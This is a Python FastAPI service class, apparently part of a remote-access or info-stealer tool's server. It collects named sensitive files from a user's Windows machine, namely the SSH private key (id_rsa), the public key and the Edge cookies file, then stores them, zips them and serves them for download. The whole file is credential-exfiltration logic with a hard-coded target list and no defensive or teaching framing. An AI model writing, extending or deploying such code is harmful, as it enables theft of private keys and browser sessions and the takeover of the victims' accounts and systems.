import os
import tempfile
import zipfile
import logging
import re
import shutil
from fastapi.responses import FileResponse
from fastapi import HTTPException
from modules.SensitiveFilesModule import SensitiveFilesModule


class SensitiveFilesService:
    def __init__(self, sensitiveFilesModule: SensitiveFilesModule) -> None:
        self.sensitiveFilesModule = sensitiveFilesModule

    async def list(self, id: str):
        try:
            response = await self.sensitiveFilesModule.list(id)
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Error while listing sensitive files: {str(e)}")

        return response

    async def retrieve(self, id: str, file: str):
        try:

            user = self.sensitiveFilesModule.user_repository.get_user(id)
            if not user:
                raise HTTPException(status_code=404, detail=f"User with id {id} not found")

            FILE_LIST = [
                f"C:\\Users\\{user.username}\\.ssh\\id_rsa",
                f"C:\\Users\\{user.username}\\.ssh\\id_rsa.pub",
                f"C:\\Users\\{user.username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Safe Browsing Cookies",
            ]

            if file == "*":

                with tempfile.TemporaryDirectory() as temp_dir:
                    temp_zip_path = os.path.join(temp_dir, 'all_files.zip')

                    for f in FILE_LIST:
                        await self.sensitiveFilesModule.retrieve_file(f, user)
                        safe_path = re.sub(r'[<>:"/\\|?*]', "_", os.path.basename(f))
                        retrieved_file_path = os.path.join(os.getenv('STORAGE_PATH'), 'users', id, safe_path)

                        if os.path.exists(retrieved_file_path):
                            shutil.copy(retrieved_file_path, os.path.join(temp_dir, safe_path))
                        else:
                            logging.warning(f"File not found after retrieval: {retrieved_file_path}")

                    # Création du ZIP
                    with zipfile.ZipFile(temp_zip_path, 'w') as zipf:
                        for file_name in os.listdir(temp_dir):
                            file_path = os.path.join(temp_dir, file_name)
                            if file_path != temp_zip_path:
                                zipf.write(file_path, os.path.basename(file_path))

                    # Copier le ZIP dans un emplacement persistant
                    final_zip_path = os.path.join(tempfile.gettempdir(), f"{id}_all_files.zip")
                    shutil.copy(temp_zip_path, final_zip_path)

                return FileResponse(final_zip_path, media_type='application/zip', filename='all_files.zip')

            else:
                if file not in FILE_LIST:
                    raise HTTPException(status_code=404, detail=f"File {file} not found in the user's file list")

                await self.sensitiveFilesModule.retrieve_file(file, user)
                safe_path = re.sub(r'[<>:"/\\|?*]', "_", os.path.basename(file))
                file_path = os.path.join(os.getenv('STORAGE_PATH'), 'users', id, safe_path)

                if not os.path.exists(file_path):
                    raise HTTPException(status_code=404, detail=f"File {file} was not retrieved successfully")

                return FileResponse(file_path, media_type='application/octet-stream',
                                    filename=os.path.basename(safe_path))

        except Exception as e:
            logging.error(f"Error while retrieving sensitive files: {str(e)}")
            raise HTTPException(status_code=500, detail=f"Error while retrieving sensitive files: {str(e)}")